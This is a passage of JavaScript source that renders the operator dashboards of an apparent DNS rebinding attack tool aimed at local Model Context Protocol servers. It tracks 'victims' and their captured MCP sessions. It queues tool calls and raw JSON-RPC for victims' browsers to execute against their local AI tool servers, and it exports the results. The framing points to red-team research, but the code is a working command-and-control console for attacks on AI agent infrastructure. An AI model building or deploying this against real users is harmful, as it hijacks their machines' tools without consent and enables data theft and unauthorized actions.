.row:last-child { border-bottom:0; }
.row-title { display:flex; align-items:center; justify-content:space-between; gap: 12px; }
.row small { color: var(--muted); }
.compact-list { display: grid; gap: 10px; }
.candidate { border: 2px solid var(--line); border-radius: 8px; padding: 12px; background: #fffdf2; }
.candidate.ready { border-color: var(--line); border-left: 5px solid var(--green); background: #f0fff7; }
.candidate.slow { border-color: var(--line); border-left: 5px solid var(--yellow); background: #fff3b8; }
.candidate .actions { margin-top: 10px; display: flex; gap: 8px; }
.candidate a { color: var(--text); font-weight: 800; text-decoration: underline; text-decoration-thickness: 2px; text-decoration-color: var(--yellow); }
.muted-box { border: 2px solid #d8cda9; border-radius: 8px; background: #fffdf2; padding: 12px; color: var(--muted); }
pre {
  margin: 8px 0 0;
  padding: 10px;
  border-radius: 6px;
  background: var(--code);
  color: #f8f8f2;
  overflow: auto;
  font-size: 12px;
}
.status-ok { color: #027a48; font-weight: 700; }
.status-warn { color: #9a6700; font-weight: 700; }
.status-bad { color: var(--error); font-weight: 700; }
.url-state { margin-top: 8px; font-size: 12px; color: var(--muted); }
.auth {
  margin-top: 18px;
  padding: 12px;
  border: 2px solid var(--line);
  border-radius: 8px;
  background: var(--surface);
}
.operatorDialogOverlay {
  position: fixed;
  inset: 0;
  z-index: 40;
  display: grid;
  place-items: center;
  padding: 18px;
  background: rgba(17, 16, 19, .42);
}
.operatorDialog {
  display: grid;
  gap: 12px;
  width: min(470px, calc(100vw - 36px));
  border: 3px solid var(--line);
  border-radius: 8px;
  padding: 16px;
  background: var(--surface);
  box-shadow: 5px 5px 0 var(--line);
}
.operatorDialogEyebrow {
  margin: 0;
  color: var(--muted);
  font-size: 11px;
  font-weight: 900;
  letter-spacing: .04em;
  text-transform: uppercase;
}
.operatorDialog h2 {
  margin: 0;
}
.operatorDialogBody {
  margin: 0;
  color: var(--muted);
  font-size: 13px;
  font-weight: 800;
  line-height: 1.45;
}
.operatorDialogActions {
  display: flex;
  justify-content: flex-end;
  gap: 8px;
  flex-wrap: wrap;
}
${SNAP_BACK_INTERACTION_CSS}
@media (max-width: 900px) {
  main, .panes, .grid { grid-template-columns: 1fr; }
  aside { border-right: 0; border-bottom: 1px solid var(--line); }
}
</style>
</head>
<body>
<header>
  <div class="brand"><span class="mark"></span><span class="serverBrandTitle">MCP Binder Dashboard</span></div>
  <div class="topline"><span class="pill">${escapeHtml(options.dashboardFqdn || "dashboard.example.com")}</span><span id="conn">offline</span></div>
</header>
<main>
  <aside>
    <h1>DNS Rebinding Control</h1>
    <p>Browser-mediated MCP control and evidence capture.</p>
    <div class="auth">
      <label for="token">Operator token</label>
      <input id="token" type="password" placeholder="token">
      <button id="saveToken" type="button" style="margin-top:10px">Save token</button>
      <button id="exportEvidence" type="button" style="margin-top:10px">Export evidence</button>
      <button id="clearLive" type="button" style="margin-top:10px">Clear live state</button>
      <p style="margin-top:10px">Token-protected operator controls and evidence export.</p>
    </div>
  </aside>
  <section>
    <div>
      <h1>Attack Surface</h1>
      <p>Sessions register from rebound browser payloads. Results are dashboard evidence.</p>
    </div>
    <div class="grid">
      <div class="metric"><b id="mSessions">0</b><span>probe sessions</span></div>
      <div class="metric"><b id="mVictims">0</b><span>victims</span></div>
      <div class="metric"><b id="mConnected">0</b><span>connected MCPs</span></div>
      <div class="metric"><b id="mResults">0</b><span>results</span></div>
    </div>
    <div class="panes">
      <div class="panel">
        <div class="panel-head"><h2>Victims</h2><span class="status-ok">tracked</span></div>
        <div class="panel-body" id="victims"></div>
      </div>
      <div class="panel">
        <div class="panel-head"><h2 id="mcpPanelTitle">MCPs</h2><button class="secondary" id="refresh" type="button">Refresh</button></div>
        <div class="panel-body" id="victimMcps"></div>
      </div>
    </div>
    <details class="panel" style="margin-top:16px">
      <summary style="padding:12px 14px; cursor:pointer; font-weight:800">Raw evidence</summary>
      <div class="panel-body" id="events"></div>
    </details>
  </section>
</main>
<script>
const tokenRequired = ${options.token ? "true" : "false"};
let token = localStorage.getItem("mcpRebindToken") || "";
let sessionsCache = [];
let victimsCache = [];
let resultsCache = [];
let selectedVictimId = localStorage.getItem("mcpRebindSelectedVictim") || "";
document.getElementById("token").value = token;
document.getElementById("saveToken").onclick = () => {
  token = document.getElementById("token").value.trim();
  localStorage.setItem("mcpRebindToken", token);
  showTokenSavedHint(document.getElementById("saveToken"), "Token saved");
  refresh();
};
function authHeaders() {
  return token ? { "Authorization": "Bearer " + token } : {};
}
async function api(path, opts={}) {
  opts.headers = { ...(opts.headers || {}), ...authHeaders() };
  const res = await fetch(path, opts);
  if (!res.ok) throw new Error(await res.text());
  return res.json();
}
function esc(value) {
  return String(value ?? "").replace(/[&<>"']/g, (char) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[char]));
}
function pretty(v) {
  try { return JSON.stringify(v, null, 2); } catch(e) { return String(v); }
}
function age(ts) {
  const d = Date.now() - Date.parse(ts);
  if (!Number.isFinite(d)) return ts || "";
  return Math.max(0, Math.round(d / 1000)) + "s ago";
}
function sessionUrl(s) {
  return (s && (s.meta?.url || s.descriptor?.probeUrl || s.sourceUrl || s.url || s.origin)) || "";
}
function sessionPort(s) {
  const target = String(s?.meta?.target || s?.target || "");
  const targetMatch = target.match(/:(\\d{1,5})(?:\\D|$)/);
  if (targetMatch) return targetMatch[1];
  try { return new URL(sessionUrl(s)).port || "80"; } catch(e) { return s?.meta?.port || "?"; }
}
function sessionPortNum(s) {
  const p = Number(sessionPort(s));
  return Number.isFinite(p) ? p : 0;
}
function findTools(value, out=[]) {
  if (!value) return out;
  if (Array.isArray(value)) {
    value.forEach(v => findTools(v, out));
    return out;
  }
  if (typeof value !== "object") return out;
  if (Array.isArray(value.tools)) {
    value.tools.forEach(t => {
      if (t && typeof t === "object" && t.name) out.push(t);
    });
  }
  Object.values(value).forEach(v => {
    if (v && typeof v === "object") findTools(v, out);
  });
  return out;
}
function discoveredToolsForSession(s) {
  const seen = new Set();
  const tools = [];
  resultsCache.filter(r => s && r.session === s.id).forEach(r => {
    findTools(r.data).forEach(t => {
      if (!seen.has(t.name)) {
        seen.add(t.name);
        tools.push(t);
      }
    });
  });
  return tools.sort((a,b) => String(a.name).localeCompare(String(b.name)));
}
function sessionTarget(s) {
  const explicit = s && s.meta && s.meta.target ? String(s.meta.target) : "";
  const tools = discoveredToolsForSession(s);
  const port = sessionPort(s);
  const transport = s && s.transport ? String(s.transport) : "streamable";
  if (explicit && !["auto-streamable", "auto-sse", "generic streamable MCP", "generic SSE MCP", "unknown MCP"].includes(explicit)) return explicit;
  if (tools.length) return "MCP on :" + port + " (" + transport + ", " + tools.length + " tools)";
  return "MCP on :" + port + " (" + transport + ")";
}
function newestSession(a, b) {
  return String(a.lastSeen || a.createdAt || "").localeCompare(String(b.lastSeen || b.createdAt || "")) >= 0 ? a : b;
}
function newestByPort(list) {
  const byEndpoint = new Map();
  list.forEach(s => {
    const port = sessionPortNum(s);
    const transport = s.transport || "streamable";
    const key = port + ":" + transport;
    if (!byEndpoint.has(key)) byEndpoint.set(key, s);
    else byEndpoint.set(key, newestSession(byEndpoint.get(key), s));
  });
  return [...byEndpoint.entries()]
    .sort((a,b) => {
      const [ap, at] = a[0].split(":");
      const [bp, bt] = b[0].split(":");
      return Number(ap) - Number(bp) || String(at).localeCompare(String(bt));
    })
    .map(x => x[1]);
}
function sessionReady(s) {
  const st = String(s.status || "");
  const hasResult = resultsCache.some(r => s && r.session === s.id);
  return hasResult || st === "initialized" || st === "polling" || st.startsWith("task:") || st === "tools/list" || st.includes("tools-listed") || st.includes("initialized");
}
function renderCandidate(s) {
  const st = String(s.status || "connected");
  const tools = discoveredToolsForSession(s);
  const opsUrl = "/ops?session=" + encodeURIComponent(s.id);
  return '<div class="candidate ready">' +
    '<div class="row-title"><strong>' + esc(sessionTarget(s)) + '</strong><small>port ' + esc(sessionPort(s)) + '</small></div>' +
    '<small>' + esc(s.clientIp || "unknown ip") + ' · ' + esc(s.transport || "streamable") + ' · <span class="status-ok">' + esc(st) + '</span>' + (tools.length ? " · " + tools.length + " tools" : "") + '</small>' +
    '<div class="actions"><a href="' + esc(opsUrl) + '" target="_blank">Operate</a><span>' + esc(sessionUrl(s)) + '</span></div>' +
  '</div>';
}
function renderVictim(v) {
  const sessions = (v.sessions || []).length;
  const ips = (v.clientIps || (v.clientIp ? [v.clientIp] : [])).join(", ") || v.origin || "unknown ip";
  const ports = (v.ports || []).join(", ") || "pending";
  const name = v.displayName || ips || v.id;
  const active = v.id === selectedVictimId ? " selectable active" : " selectable";
  return '<div class="row' + active + '" data-victim="' + esc(v.id) + '">' +
    '<div class="row-title"><strong>' + esc(name) + '</strong><small>' + esc(age(v.lastSeen || v.firstSeen)) + '</small></div>' +
    '<small>' + esc(ips) + ' · ' + sessions + ' captured MCP session' + (sessions === 1 ? "" : "s") + '</small>' +
    '<small>scan ports: ' + esc(ports) + '</small>' +
  '</div>';
}
function renderEvent(e) {
  return '<div class="row">' +
    '<div class="row-title"><strong>' + esc(e.kind || "event") + '</strong><small>' + esc(e.ts || e.receivedAt || e.createdAt || "") + '</small></div>' +
    '<small>' + esc(e.client || e.clientIp || "") + '</small>' +
    '<pre>' + esc(pretty(e.payload || e)) + '</pre>' +
  '</div>';
}
async function refresh() {
  try {
    const data = await api("/api/state");
    document.getElementById("conn").textContent = "online";
    document.getElementById("conn").className = "status-ok";
    const victims = Object.values(data.victims || {}).sort((a,b) => String(b.lastSeen || "").localeCompare(String(a.lastSeen || "")));
    const sessions = Object.values(data.sessions || {}).sort((a,b) => String(b.lastSeen || "").localeCompare(String(a.lastSeen || "")));
    const results = data.results || [];
    if (!selectedVictimId && victims.length) selectedVictimId = victims[0].id;
    if (selectedVictimId && !victims.find(v => v.id === selectedVictimId) && victims.length) selectedVictimId = victims[0].id;
    localStorage.setItem("mcpRebindSelectedVictim", selectedVictimId || "");
    victimsCache = victims;
    sessionsCache = sessions;
    resultsCache = results;
    const events = data.events || [];
    document.getElementById("mVictims").textContent = victims.length;
    document.getElementById("mSessions").textContent = sessions.length;
    document.getElementById("mConnected").textContent = sessions.filter(sessionReady).length;
    document.getElementById("mResults").textContent = results.length;
    document.getElementById("victims").innerHTML = victims.map(renderVictim).join("") || '<p>No victim browsers have loaded the lab URL.</p>';
    document.querySelectorAll("[data-victim]").forEach(el => {
      el.onclick = () => {
        selectedVictimId = el.dataset.victim;
        localStorage.setItem("mcpRebindSelectedVictim", selectedVictimId);
        refresh();
      };
    });
    const selectedVictim = victims.find(v => v.id === selectedVictimId) || null;
    const victimSessions = selectedVictim ? sessions.filter(s => s.victimId === selectedVictim.id || (selectedVictim.sessions || []).includes(s.id)) : [];
    const latestPortSessions = newestByPort(victimSessions.filter(sessionReady));
    document.getElementById("mcpPanelTitle").textContent = selectedVictim ? ("MCPs for " + (selectedVictim.displayName || selectedVictim.id)) : "MCPs";
    document.getElementById("victimMcps").innerHTML = latestPortSessions.map(renderCandidate).join("") || '<div class="muted-box">No connected MCPs for this victim yet. The scanner is still waiting for a valid initialize/tools-list response.</div>';
    document.getElementById("events").innerHTML = events.slice().reverse().slice(0, 80).map(renderEvent).join("") || '<p>No evidence yet.</p>';
  } catch (e) {
    document.getElementById("conn").textContent = tokenRequired ? "auth required" : "error";
    document.getElementById("conn").className = "status-bad";
  }
}
document.getElementById("refresh").onclick = refresh;
document.getElementById("exportEvidence").onclick = async () => {
  const data = await api("/api/export");
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "mcp-binder-evidence-" + new Date().toISOString().replace(/[:.]/g, "-") + ".json";
  a.click();
  URL.revokeObjectURL(a.href);
};
document.getElementById("clearLive").onclick = async () => {
  const approved = await showDecisionDialog({
    title: "Clear live state",
    body: "Clear live dashboard sessions, tasks, results, and in-memory events? JSONL evidence on disk is not deleted.",
    confirmLabel: "Clear Live State",
    cancelLabel: "Cancel"
  });
  if (!approved) return;
  await api("/api/clear", { method: "POST" });
  refresh();
};
function showDecisionDialog(options = {}) {
  return new Promise((resolve) => {
    const existing = document.querySelector("#operatorDialogOverlay");
    if (existing) existing.remove();
    const overlay = document.createElement("div");
    overlay.id = "operatorDialogOverlay";
    overlay.className = "operatorDialogOverlay";
    const dialog = document.createElement("section");
    dialog.className = "operatorDialog";
    dialog.setAttribute("role", "dialog");
    dialog.setAttribute("aria-modal", "true");
    dialog.setAttribute("aria-labelledby", "operatorDialogTitle");
    const eyebrow = document.createElement("p");
    eyebrow.className = "operatorDialogEyebrow";
    eyebrow.textContent = "Confirm";
    const title = document.createElement("h2");
    title.id = "operatorDialogTitle";
    title.textContent = options.title || "Confirm action";
    const body = document.createElement("p");
    body.className = "operatorDialogBody";
    body.textContent = options.body || "";
    const actions = document.createElement("div");
    actions.className = "operatorDialogActions";
    const cancel = document.createElement("button");
    cancel.type = "button";
    cancel.className = "secondary";
    cancel.textContent = options.cancelLabel || "Cancel";
    const confirm = document.createElement("button");
    confirm.type = "button";
    confirm.textContent = options.confirmLabel || "Confirm";
    function finish(value) {
      overlay.remove();
      document.removeEventListener("keydown", onKeydown);
      resolve(value);
    }
    function onKeydown(event) {
      if (event.key === "Escape") finish(false);
    }
    cancel.addEventListener("click", () => finish(false));
    confirm.addEventListener("click", () => finish(true));
    overlay.addEventListener("click", (event) => {
      if (event.target === overlay) finish(false);
    });
    document.addEventListener("keydown", onKeydown);
    actions.append(cancel, confirm);
    dialog.append(eyebrow, title, body, actions);
    overlay.append(dialog);
    document.body.append(overlay);
    cancel.focus();
  });
}
refresh();
setInterval(refresh, 2000);
${SNAP_BACK_INTERACTION_SCRIPT}
attachServerSnapBackInteractions();
</script>
</body>
</html>`;
}

function renderOpsDashboard() {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MCP Operations</title>
<style>
:root {
  --text: #111013;
  --muted: #6b6256;
  --bg: #fff8dc;
  --surface: #fffdf2;
  --surface-2: #fff3b8;
  --line: #19150f;
  --line-strong: #19150f;
  --green: #2f9f69;
  --green-dark: #027a48;
  --yellow: #f4d331;
  --blue: #1f5fbf;
  --amber: #b76e00;
  --code: #191b16;
  --error: #eb2010;
  --sidebar-w: 320px;
  --editor-w: 460px;
}
* { box-sizing: border-box; }
body {
  margin: 0;
  font: 14px/1.45 "Poppins", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  color: var(--text);
  background:
    linear-gradient(rgba(17, 16, 19, .035) 1px, transparent 1px),
    linear-gradient(90deg, rgba(17, 16, 19, .035) 1px, transparent 1px),
    var(--bg);
  background-size: 32px 32px;
}
header {
  height: 64px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 28px;
  border-bottom: 3px solid var(--line);
  background: var(--text);
  color: #fffdf2;
}
.brand { display: flex; align-items: center; gap: 10px; font-weight: 800; }
.mark { width: 28px; height: 28px; border-radius: 50%; background: var(--green); border: 2px solid #fffdf2; display: inline-block; }
.topline { display: flex; align-items: center; gap: 10px; color: #fff3b8; font-size: 13px; }
.pill { border: 2px solid #fffdf2; border-radius: 999px; padding: 5px 10px; background: #2a251d; color: #fffdf2; text-decoration: none; }
main { display: grid; grid-template-columns: var(--sidebar-w) 8px minmax(0, 1fr); min-height: calc(100vh - 64px); }
aside { padding: 22px; background: rgba(255, 253, 242, .86); min-width: 240px; overflow: auto; }
.main-resizer { cursor: col-resize; background: linear-gradient(90deg, transparent, var(--line-strong), transparent); }
.main-resizer:hover, .main-resizer.active { background: var(--yellow); }
section { padding: 22px 28px; min-width: 0; }
h1 { margin: 0 0 4px; font-size: 24px; line-height: 1.15; letter-spacing: 0; }
h2 { margin: 0 0 12px; font-size: 15px; letter-spacing: 0; }
p { margin: 0; color: var(--muted); }
label { display: block; margin: 12px 0 6px; font-weight: 600; font-size: 12px; }
input, textarea, select {
  width: 100%;
  border: 2px solid var(--line);
  border-radius: 6px;
  padding: 9px 10px;
  font: inherit;
  background: #fffdf2;
  color: var(--text);
}
input:focus, textarea:focus, select:focus { outline: 3px solid rgba(244, 211, 49, .42); border-color: var(--line); }
textarea { min-height: 260px; resize: vertical; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
button {
  border: 2px solid var(--line);
  border-radius: 6px;
  padding: 9px 12px;
  background: var(--text);
  color: #fff;
  font-weight: 700;
  cursor: pointer;
  box-shadow: 0 2px 0 var(--line);
}
button:hover { filter: brightness(1.04); }
button.secondary { background: var(--yellow); color: var(--text); }
button.ghost { background: #fffdf2; color: var(--text); border: 2px solid var(--line); }
button.mini { padding: 6px 8px; font-size: 12px; }
button.wide { width: 100%; margin-top: 10px; }
.panel { border: 3px solid var(--line); border-radius: 8px; margin-bottom: 16px; background: var(--surface); box-shadow: 0 4px 0 rgba(17, 16, 19, .18); }
.panel-head { display:flex; align-items:center; justify-content:space-between; padding: 12px 14px; border-bottom: 2px solid var(--line); background: var(--surface); border-radius: 6px 6px 0 0; }
.panel-body { padding: 12px 14px; }
.metric-grid { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; }
.metric { border: 2px solid var(--line); border-radius: 8px; padding: 12px; background: var(--surface-2); }
.metric b { display: block; font-size: 22px; }
.metric span { color: var(--muted); font-size: 12px; }
.signal { display: flex; align-items: center; justify-content: space-between; gap: 14px; margin-top: 12px; padding: 12px; border: 2px solid var(--line); border-left: 5px solid var(--green); border-radius: 8px; background: #f0fff7; }
.signal strong { display: block; }
.signal p { font-size: 13px; }
.readiness { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 8px; margin-top: 12px; }
.ready-step { border: 2px solid var(--line); border-radius: 8px; padding: 10px; background: #fffdf2; }
.ready-step b { display: block; font-size: 12px; }
.ready-step span { color: var(--muted); font-size: 12px; }
.ready-step.done { border-color: var(--line); border-left: 5px solid var(--green); background: #f0fff7; }
.ready-step.active { border-color: var(--line); border-left: 5px solid var(--yellow); background: var(--surface-2); }
.summary-grid { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; }
.summary-card { border: 2px solid var(--line); border-radius: 8px; padding: 12px; background: var(--surface-2); }
.summary-card b { display: block; font-size: 20px; }
.summary-card span { color: var(--muted); font-size: 12px; }
.finding-list { margin: 12px 0 0; padding: 0; list-style: none; display: grid; gap: 8px; }
.finding-list li { border: 2px solid var(--line); border-left: 5px solid var(--green); padding: 8px 10px; background: #f0fff7; border-radius: 6px; }
.workspace-grid { display: grid; grid-template-columns: var(--editor-w) 8px minmax(280px, 1fr); gap: 12px; align-items: stretch; }
.workspace-resizer { cursor: col-resize; border-radius: 999px; background: var(--line); min-height: 280px; }
.workspace-resizer:hover, .workspace-resizer.active { background: var(--blue); }
.quick-actions { display: grid; gap: 8px; }
.quick-action { width: 100%; text-align: left; border: 2px solid var(--line); background: var(--surface); color: var(--text); display: grid; grid-template-columns: 1fr auto; gap: 10px; align-items: center; box-shadow: none; }
.quick-action.active { border-color: var(--line); box-shadow: 0 0 0 3px rgba(244, 211, 49, .32); background: var(--surface-2); }
.quick-action small { grid-column: 1 / -1; }
.editor-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px; }
.saved-head { display:flex; align-items:center; justify-content:space-between; gap: 10px; margin-bottom: 8px; }
.saved-requests { display: grid; gap: 8px; margin-bottom: 16px; }
.saved-request { border: 2px solid var(--line); border-radius: 8px; padding: 10px; background: var(--surface); }
.saved-request strong { display: block; overflow-wrap: anywhere; }
.saved-request small { display: block; margin-top: 4px; }
.inline-actions { display:flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
.result-card { border: 2px solid var(--line); border-left: 5px solid var(--green); border-radius: 8px; padding: 12px; margin-bottom: 10px; background: var(--surface); }
.result-card.pending { border-left-color: var(--amber); }
.result-card.error { border-left-color: var(--error); }
.result-meta { display:flex; align-items:center; justify-content:space-between; gap: 12px; margin-bottom: 8px; }
.result-actions { display:flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
.tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 10px; }
.tool-card { border: 2px solid var(--line); border-radius: 8px; padding: 12px; background: var(--surface); }
.tool-card code { display: inline-block; margin-top: 6px; color: var(--blue); }
.profile-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px; }
#profileJson { min-height: 180px; }
.diagnostics { max-height: 520px; overflow: auto; }
details.panel > summary { cursor: pointer; list-style: none; padding: 12px 14px; font-weight: 800; border-bottom: 2px solid var(--line); background: var(--surface); }
details.panel > summary::-webkit-details-marker { display: none; }
.row { border-bottom: 1px solid #e8dec5; padding: 10px 0; }
.row:last-child { border-bottom: 0; }
.row-title { display:flex; align-items:center; justify-content:space-between; gap: 12px; }
.task-grid { display: grid; gap: 8px; }
small { color: var(--muted); }
pre {
  margin: 8px 0 0;
  padding: 10px;
  border-radius: 6px;
  background: var(--code);
  color: #f8f8f2;
  overflow: auto;
  font-size: 12px;
}
.status-ok { color: var(--green-dark); font-weight: 700; }
.status-bad { color: var(--error); font-weight: 700; }
.operatorDialogOverlay {
  position: fixed;
  inset: 0;
  z-index: 40;
  display: grid;
  place-items: center;
  padding: 18px;
  background: rgba(17, 16, 19, .42);
}
.operatorDialog {
  display: grid;
  gap: 12px;
  width: min(470px, calc(100vw - 36px));
  border: 3px solid var(--line);
  border-radius: 8px;
  padding: 16px;
  background: var(--surface);
  box-shadow: 5px 5px 0 var(--line);
}
.operatorDialogEyebrow {
  margin: 0;
  color: var(--muted);
  font-size: 11px;
  font-weight: 900;
  letter-spacing: .04em;
  text-transform: uppercase;
}
.operatorDialog h2 {
  margin: 0;
}
.operatorDialogBody {
  margin: 0;
  color: var(--muted);
  font-size: 13px;
  font-weight: 800;
  line-height: 1.45;
}
.operatorDialogActions {
  display: flex;
  justify-content: flex-end;
  gap: 8px;
  flex-wrap: wrap;
}
${SNAP_BACK_INTERACTION_CSS}
.resizing, .resizing * { cursor: col-resize !important; user-select: none !important; }
@media (max-width: 900px) { main { grid-template-columns: 1fr; } aside { border-bottom: 1px solid var(--line); } .main-resizer { display: none; } }
@media (max-width: 1100px) { .workspace-grid { grid-template-columns: 1fr; } .workspace-resizer { display: none; } .readiness, .summary-grid { grid-template-columns: 1fr; } }
</style>
</head>
<body>
<header>
  <div class="brand"><span class="mark"></span><span class="serverBrandTitle">MCP Operations</span></div>
  <div class="topline"><a class="pill" href="/">capture dashboard</a><span id="conn">offline</span></div>
</header>
<main>
  <aside>
    <h1 id="targetName">Captured MCP</h1>
    <p id="targetSummary">Select an initialized session.</p>
    <label for="token">Operator token</label>
    <input id="token" type="password" placeholder="token">
    <button id="saveToken" type="button" style="margin-top:10px">Save token</button>
    <label for="session">Captured session</label>
    <select id="session"></select>
    <div class="panel" style="margin-top:16px">
      <div class="panel-head"><h2>Session</h2><span id="sessionStatus"></span></div>
      <div class="panel-body" id="sessionMeta"><p>No session selected.</p></div>
    </div>
  </aside>
  <div id="mainResize" class="main-resizer" title="Resize session pane"></div>
  <section>
    <div class="panel">
      <div class="panel-head"><h2>Control Channel</h2><span id="lastActivity"></span></div>
      <div class="panel-body">
        <div class="metric-grid">
          <div class="metric"><b id="mQueued">0</b><span>queued commands</span></div>
          <div class="metric"><b id="mClaimed">0</b><span>claimed by victim</span></div>
          <div class="metric"><b id="mDone">0</b><span>MCP responses</span></div>
          <div class="metric"><b id="mEvents">0</b><span>telemetry events</span></div>
        </div>
        <div class="signal">
          <div>
            <strong id="channelState">Waiting for victim</strong>
            <p id="channelHint">Open a fresh payload URL on the victim machine.</p>
          </div>
          <span id="channelBadge" class="status-bad">offline</span>
        </div>
        <div class="readiness" id="readiness"></div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-head"><h2>MCP Tool Console</h2><button class="secondary" id="refresh" type="button">Refresh</button></div>
      <div class="panel-body workspace-grid">
        <div>
          <label for="toolSelect">Operation</label>
          <select id="toolSelect"></select>
          <label for="toolArgs">Arguments / JSON-RPC body</label>
          <textarea id="toolArgs">{}</textarea>
          <div class="editor-actions">
            <button class="ghost" id="saveCurrent" type="button">Save request</button>
            <button id="runSelected" type="button">Run operation</button>
          </div>
        </div>
        <div id="workspaceResize" class="workspace-resizer" title="Resize operation panes"></div>
        <div>
          <div class="saved-head"><h2>Saved Requests</h2><span id="savedCount">0</span></div>
          <div class="saved-requests" id="savedRequests"></div>
          <h2>Quick Actions</h2>
          <div class="quick-actions" id="taskCards"></div>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-head"><h2>Results</h2><span class="status-ok" id="resultCount">0 results</span></div>
      <div class="panel-body" id="results"></div>
    </div>
    <details class="panel">
      <summary>Evidence Summary <span id="evidenceState">pending</span></summary>
      <div class="panel-body" id="evidenceSummary"></div>
    </details>
    <details class="panel">
      <summary>Discovered MCP Tools</summary>
      <div class="panel-head"><h2>Discovered MCP Tools</h2><button id="copyProfile" type="button">Copy profile JSON</button></div>
      <div class="panel-body">
        <div class="tool-grid" id="toolInventory"></div>
        <label for="profileJson">Generated target profile</label>
        <textarea id="profileJson" readonly>{}</textarea>
        <div class="profile-actions">
          <button id="refreshProfile" class="secondary" type="button">Build from tools/list</button>
        </div>
      </div>
    </details>
    <details class="panel">
      <summary>Diagnostics</summary>
      <div class="panel-body diagnostics">
        <h2>Raw JSON-RPC</h2>
        <textarea id="rawRpc">{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}</textarea>
        <button id="runRaw" type="button" class="wide">Queue raw RPC</button>
        <h2 style="margin-top:18px">Latest telemetry</h2>
        <pre id="latestEvent"></pre>
        <h2 style="margin-top:18px">Operation Timeline</h2>
        <div id="timeline"></div>
      </div>
    </details>
  </section>
</main>
<script>
const tokenRequired = ${options.token ? "true" : "false"};
const params = new URLSearchParams(location.search);
let token = localStorage.getItem("mcpRebindToken") || "";
let requestedSession = params.get("session") || "";
let state = null;
let activeTaskIndex = -1;
let activeSessionId = "";
const SAVED_REQUESTS_KEY = "mcpOpsSavedRequestsV1";
document.getElementById("token").value = token;
function clamp(n, min, max) { return Math.max(min, Math.min(max, n)); }
function applySavedPaneSizes() {
  const sidebar = Number(localStorage.getItem("mcpOpsSidebarW") || 0);
  const editor = Number(localStorage.getItem("mcpOpsEditorW") || 0);
  if (sidebar) document.documentElement.style.setProperty("--sidebar-w", clamp(sidebar, 250, Math.min(560, window.innerWidth - 520)) + "px");
  if (editor) document.documentElement.style.setProperty("--editor-w", clamp(editor, 320, Math.min(720, window.innerWidth - 420)) + "px");
}
function dragPane(handle, onMove, onDone) {
  if (!handle) return;
  handle.addEventListener("pointerdown", e => {
    e.preventDefault();
    handle.classList.add("active");
    document.body.classList.add("resizing");
    try { handle.setPointerCapture(e.pointerId); } catch(err) {}
    const move = ev => onMove(ev);
    const up = ev => {
      document.removeEventListener("pointermove", move);
      document.removeEventListener("pointerup", up);
      handle.classList.remove("active");
      document.body.classList.remove("resizing");
      if (onDone) onDone(ev);
    };
    document.addEventListener("pointermove", move);
    document.addEventListener("pointerup", up);
  });
}
applySavedPaneSizes();
dragPane(document.getElementById("mainResize"), ev => {
  const width = clamp(ev.clientX, 250, Math.min(560, window.innerWidth - 520));
  document.documentElement.style.setProperty("--sidebar-w", width + "px");
  localStorage.setItem("mcpOpsSidebarW", String(width));
});
dragPane(document.getElementById("workspaceResize"), ev => {
  const grid = document.querySelector(".workspace-grid");
  if (!grid) return;
  const left = grid.getBoundingClientRect().left;
  const width = clamp(ev.clientX - left, 320, Math.min(760, grid.clientWidth - 320));
  document.documentElement.style.setProperty("--editor-w", width + "px");
  localStorage.setItem("mcpOpsEditorW", String(width));
});
function authHeaders() { return token ? { "Authorization": "Bearer " + token } : {}; }
async function api(path, opts={}) {
  opts.headers = { ...(opts.headers || {}), ...authHeaders() };
  const res = await fetch(path, opts);
  if (!res.ok) throw new Error(await res.text());
  return res.json();
}
function pretty(v) { try { return JSON.stringify(v, null, 2); } catch(e) { return String(v); } }
function esc(v) {
  const m = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
  return String(v == null ? "" : v).replace(/[&<>"']/g, c => m[c]);
}
function age(ts) {
  const d = Date.now() - Date.parse(ts);
  if (!Number.isFinite(d)) return ts || "";
  return Math.max(0, Math.round(d / 1000)) + "s ago";
}
function sessions() {
  return Object.values((state && state.sessions) || {}).sort((a,b) => (b.lastSeen || "").localeCompare(a.lastSeen || ""));
}
function selectedSession() {
  const sid = document.getElementById("session").value || requestedSession;
  return sessions().find(s => s.id === sid) || sessions()[0] || null;
}
async function queueTask(task) {
  const s = selectedSession();
  if (!s) return;
  const created = await api("/api/tasks/" + encodeURIComponent(s.id), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(task)
  });
  await refresh();
  return created;
}
function taskPayload(task) {
  if (!task) return { kind: "tools/list" };
  return { kind: task.kind || "tools/list", tool: task.tool || "", args: task.args || {}, rpc: task.rpc || null };
}
function operationBody(task) {
  if (!task) return {};
  if (task.kind === "rpc") return task.rpc || {};
  return task.args || {};
}
function currentTasks() {
  const s = selectedSession();
  return generatedTasks(s);
}
function selectedTask() {
  const tasks = currentTasks();
  const idx = Number(document.getElementById("toolSelect").value || 0);
  return tasks[idx] || null;
}
function loadTaskIntoEditor(task) {
  document.getElementById("toolArgs").value = pretty(operationBody(task));
}
function taskEditorKey(s, task) {
  if (!s || !task) return "";
  return [
    s.id || "",
    task.kind || "tools/list",
    task.tool || "",
    task.name || "",
  ].join("|");
}
function requestPayload(task) {
  const payload = taskPayload(task);
  if (payload.kind === "rpc") {
    payload.rpc = task && task.rpc ? task.rpc : payload.rpc;
  } else {
